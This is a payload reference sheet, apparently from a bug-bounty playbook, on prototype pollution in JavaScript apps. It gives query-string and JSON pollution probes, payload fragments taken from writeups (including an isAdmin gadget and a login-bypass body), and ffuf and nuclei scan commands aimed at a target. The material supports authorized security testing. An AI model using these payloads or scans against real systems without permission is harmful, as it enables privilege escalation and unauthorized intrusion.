# Prototype Pollution & Client-Side Object Injection — HackerOne field guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `?__proto__[polluted]=yes` `?constructor[prototype][polluted]=yes`

- `{"__proto__":{"isAdmin":true}}`

- `a[__proto__][x]=1` in qs/body-parser



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 15× | `__proto__` |

| 4× | `{__proto__: {...}}` |

| 4× | `$.extend` |

| 3× | `{constructor: {prototype: {...}}}` |

| 3× | `@firebase/util` |

| 2× | `%%{init: { '__proto__': {'polluted': 'asdf'}} }%% / sequenceDiagram / Alice->>Bob: Hi Bob / Bob->>Alice: Hi Alice` |

| 2× | `fix(misc) use safeJsonParse from js-utils` |

| 2× | `{"text":"a","title":{"__proto__":{"where":{"name":"sqlinjection","where":null}}}}` |

| 2× | `__proto__.polluted` |

| 1× | `%%{init: {<JSON_OBJECT>}}%%` |

| 1× | `\n${cnf.themeCSS}` |

| 1× | `\n:root { --mermaid-font-family: ${cnf.fontFamily}}` |

| 1× | `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}` |

| 1× | `let expr = require('property-expr') / obj = {} / expr.setter('constructor.prototype.isAdmin')(obj,true) / console.log({}.isAdmin) // true` |

| 1× | `dest["__proto__"]` |

| 1× | `.push()` |

| 1× | `ref: Cleanup BridgeChannelMessage (remove unnecessary type field).` |

| 1× | `POST /auth/login / {"email":{"email":1},"password":"1234"}` |

| 1× | `> console.table({a: 1, b: 1, c: 1}, ['__proto__']) / Uncaught TypeError: Cannot create property '0' on string '' / > Object.prototype / [Obj` |

| 1× | `const keys = properties \\|\\| ObjectKeys(item); / for (const key of keys) { / + if (key === '__proto__') { / + continue / + } / if (map[key]` |



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_prototype-pollution.txt` | 52 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_prototype-pollution.txt \

     -mc all -fc 404 -fs 0 -rate 40

```



## Nuclei



Scanner coverage is minimal; test merge/query parsers and confirm a downstream gadget.



```sh

nuclei -u https://target -tags prototype-pollution \

       -severity low,medium,high,critical -rl 40 -o nuclei_prototype-pollution.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
